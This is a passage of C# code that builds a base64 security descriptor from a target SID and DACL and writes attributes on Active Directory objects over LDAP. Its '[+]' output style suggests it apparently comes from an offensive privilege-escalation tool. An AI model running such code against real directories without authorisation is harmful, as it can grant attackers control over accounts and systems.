                    targetSid,
                    null,
                    dacl
                );
            }

            byte[] sdBytes = new byte[sd.BinaryLength];
            sd.GetBinaryForm(sdBytes, 0);
            return Convert.ToBase64String(sdBytes);
        }

        static void ModifyAttribute(LdapConnection connection, string distinguishedName, string attributeName, string attributeValue)
        {
            DirectoryAttributeModification mod = new DirectoryAttributeModification();
            mod.Name = attributeName;
            mod.Operation = DirectoryAttributeOperation.Replace;

            if (!string.IsNullOrEmpty(attributeValue))
            {
                mod.Add(Convert.FromBase64String(attributeValue));
            }

            ModifyRequest modifyRequest = new ModifyRequest(distinguishedName, mod);

            try
            {
                ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                Console.WriteLine("[+] Successfully modified " + attributeName);
            }
            catch (DirectoryOperationException ex)
            {
                if (ex.Response.ResultCode == ResultCode.NoSuchObject)
                {
                    throw new Exception("Target object not found: " + distinguishedName);
                }
                else if (ex.Response.ResultCode == ResultCode.InsufficientAccessRights)
                {
                    throw new Exception("Insufficient permissions");
                }
                else
                {
                    throw new Exception("LDAP error: " + ex.Response.ResultCode);
                }
            }
        }
    }
}
